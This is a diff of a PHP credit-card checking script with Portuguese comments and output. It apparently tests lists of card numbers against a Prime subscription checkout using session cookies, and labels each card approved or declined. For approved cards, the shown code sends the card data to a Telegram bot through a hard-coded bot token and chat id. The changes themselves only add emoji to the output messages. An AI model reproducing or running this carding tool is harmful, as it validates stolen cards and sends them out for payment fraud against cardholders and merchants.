@@ -63,6 +63,7 @@ if ($ano < 3) {
     $ano = '20' . $ano;
 }
 
+
 // ... (todas as funções e requisições do seu código original seguem aqui, sem alterações)
 function corrigirTokens($input) {
     $pattern = '/="([^"]* [^"]*)"/';
@@ -995,39 +996,31 @@ if (is_numeric($cc) && (strlen($cc) == 16 || strlen($cc) == 15)) {
 deletecard($datajson);
 
 if (strpos($mesgirespfim, 'BILLING_ADDRESS_RESTRICTED') !== false || strpos($mesgirespfim, 'Non è stato possibile completare la tua iscrizione a Prime. Ti consigliamo di riprovare durante il proceso di checkout.') !== false) {
-    echo "Aprovada $lista | Authorised  usa";
+    echo "✅Aprovada $lista | Authorised  🇺🇸";
     
     // Enviar live aprovada para o bot do Telegram
 $mensagem = urlencode("✅ Live aprovada: $lista"); // substitua pela variável correta
 file_get_contents("https://api.telegram.org/bot7748457693:AAHGW30nEHdbGBI6pCZNdQPzCUgUPiUfO4k/sendMessage?chat_id=-1002804633645&text={$mensagem}");
     exit();
 } else if (strpos($mesgirespfim, 'InvalidInput') !== false) {
-    echo "Reprovada $lista | PAGAMENTO RECUSADO  usa";
+    echo "❌Reprovada $lista | PAGAMENTO RECUSADO  🇺🇸";
     exit();
 } else if (strpos($mesgirespfim, 'HARDVET_VERIFICATION_FAILED') !== false || strpos($mesgirespfim, 'hardVet') !== false || strpos($mesgirespfim, "HARDVET_VERIFICATION_FAILED") !== false) {
-    echo "Reprovada $lista | PAGAMENTO RECUSADO  usa";
+    echo "❌Reprovada $lista | PAGAMENTO RECUSADO  🇺🇸";
     exit();
 } elseif (strpos($mesgirespfim, 'There was an error validating your payment method') !== false || strpos($mesgirespfim, "There was an error validating your payment method. Please update or add a new payment method and try again") !== false) {
-    echo "Reprovada $lista | ERRO NA VALIDAÇÃO DO MÉTODO DE PAGAMENTO  usa";
+    echo "❌Reprovada $lista | ERRO NA VALIDAÇÃO DO MÉTODO DE PAGAMENTO  🇺🇸";
     exit();
 } else {
-      echo "<font color='white'>Reprovada -> $lista | Retorno:<font color='red'> VERIFIQUE O SEUS COOKIES, COOKIES RUIM</font>";
+      echo "<font color='white'>❌Reprovada -> $lista | Retorno:<font color='red'> VERIFIQUE O SEUS COOKIES, COOKIES RUIM</font>";
       header('HTTP/1.1 200 OK');
       exit();
 }
 } else {
     $cardInfo = bin($bin);
-    echo "Reprovada $lista | CARTÃO INVÁLIDO  usa";
+    echo "❌Reprovada $lista | CARTÃO INVÁLIDO  🇺🇸";
     header('HTTP/1.1 200 OK');
     exit();
 }
+
 ?>
-
-
-
-
-
-
-
-
-
